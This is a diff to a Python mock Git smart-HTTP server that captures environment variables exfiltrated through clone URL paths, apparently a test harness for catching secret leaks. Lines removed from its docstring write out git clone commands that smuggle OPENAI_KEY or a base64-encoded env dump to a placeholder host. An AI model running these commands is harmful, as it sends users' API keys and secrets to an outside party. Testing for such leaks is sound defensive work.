@@ -3,24 +3,6 @@
 Mock Git smart-HTTP server that captures environment variables exfiltrated
 through the clone URL.
 
-It serves a single repository over Git's smart HTTP protocol for *any*
-``git clone http://<host>/...`` request, while capturing secrets hidden in
-the URL path.  Captured variables are appended to ``exfiltration.txt`` in
-``--result-dir`` as ``VAR_NAME=value`` lines.
-
-Two exfiltration formats are auto-detected (no flags needed):
-
-  1. Single variable (name is carried in the URL itself):
-        git clone "http://<host>/OPENAI_KEY=$OPENAI_KEY/repo.git"
-     -> captures:  OPENAI_KEY=sk-...
-
-  2. All variables (base64url-encoded ``env`` dump):
-        git clone "http://<host>/$(env | base64 -w0 | tr '+/' '-_')/repo.git"
-     -> decodes the blob and captures every VAR_NAME=value line
-
-The repo name in the URL is ignored: every clone returns the repo pointed to
-by ``--repo-path``.
-
 Usage:
     sudo python3 mock_git_server.py \\
         --repo-path /path/to/repo.git \\
@@ -50,7 +32,7 @@ def _pkt_line(data: bytes) -> bytes:
 
 
 def _parse_env_text(text: str):
-    """Return [(name, value), ...] for every VAR=value line in *text*."""
+    """Return [(name, value), ...] for every VAR=value line in text."""
     pairs = []
     for line in text.splitlines():
         m = _ENV_LINE.match(line)
@@ -60,14 +42,7 @@ def _parse_env_text(text: str):
 
 
 def _classify(secret: str):
-    """Classify a URL-path secret into [(name, value), ...] pairs.
-
-    Order matters:
-      * base64url-encoded ``env`` dump  -> many pairs (multi-var).
-      * plain ``NAME=value``            -> single pair (single-var).
-      * anything else                   -> saved under the name SECRET.
-    """
-    # 1) Try the multi-variable (base64url env dump) format first.
+    """Classify a URL-path secret into [(name, value), ...] pairs."""
     padded = secret + "=" * (-len(secret) % 4)
     try:
         text = base64.urlsafe_b64decode(padded).decode("utf-8")
@@ -78,12 +53,10 @@ def _classify(secret: str):
         if pairs:
             return pairs
 
-    # 2) Plain single-variable format: NAME=value.
     m = _ENV_LINE.match(secret)
     if m:
         return [(m.group(1), m.group(2))]
 
-    # 3) Fallback: an unnamed value.
     return [("SECRET", secret)]
 
 
@@ -122,8 +95,6 @@ class GitExfilServer(ThreadingHTTPServer):
 class Handler(BaseHTTPRequestHandler):
     server_version = "MockGitServer/1.0"
 
-    # -- helpers ----------------------------------------------------------
-
     def _send(self, code: int, content_type: str, body: bytes) -> None:
         self.send_response(code)
         self.send_header("Content-Type", content_type)
@@ -141,8 +112,6 @@ class Handler(BaseHTTPRequestHandler):
         if self.server.host and domain and domain != self.server.host:
             print(f"WARNING: Host header {host!r} != configured {self.server.host!r}",
                   flush=True)
-
-    # -- git smart HTTP ---------------------------------------------------
 
     def _handle_git_request(self) -> None:
         parsed = urlparse(self.path)
@@ -177,8 +146,6 @@ class Handler(BaseHTTPRequestHandler):
             self.send_error(500, proc.stderr.decode(errors="replace"))
             return
 
-        # `git upload-pack --advertise-refs` omits the mandatory service
-        # announcement, so prepend it per the smart HTTP protocol.
         body = _pkt_line(b"# service=git-upload-pack\n") + b"0000" + proc.stdout
         self._send(200, "application/x-git-upload-pack-advertisement", body)
 
@@ -195,8 +162,6 @@ class Handler(BaseHTTPRequestHandler):
 
         self._send(200, "application/x-git-upload-pack-result", proc.stdout)
 
-    # -- exfiltration -----------------------------------------------------
-
     def _capture(self, path: str) -> None:
         """Extract the secret prefix from the URL path and save any vars."""
         for suffix in ("/info/refs", "/git-upload-pack"):
@@ -206,8 +171,6 @@ class Handler(BaseHTTPRequestHandler):
         else:
             return
 
-        # path is now "/<secret...>/<repo-name>"; the repo name is the last
-        # segment, everything before it is the secret.
         parts = [p for p in path.split("/") if p]
         if len(parts) < 2:
             return
@@ -217,8 +180,6 @@ class Handler(BaseHTTPRequestHandler):
 
         for name, value in _classify(secret):
             self.server.sink.add(name, value)
-
-    # -- HTTP verbs -------------------------------------------------------
 
     def do_GET(self) -> None:
         if urlparse(self.path).path == "/":
@@ -232,10 +193,6 @@ class Handler(BaseHTTPRequestHandler):
     def log_message(self, fmt, *args) -> None:
         print(f"[{self.client_address[0]}] {fmt % args}", flush=True)
 
-
-# ---------------------------------------------------------------------------
-# CLI
-# ---------------------------------------------------------------------------
 
 def main() -> None:
     p = argparse.ArgumentParser(
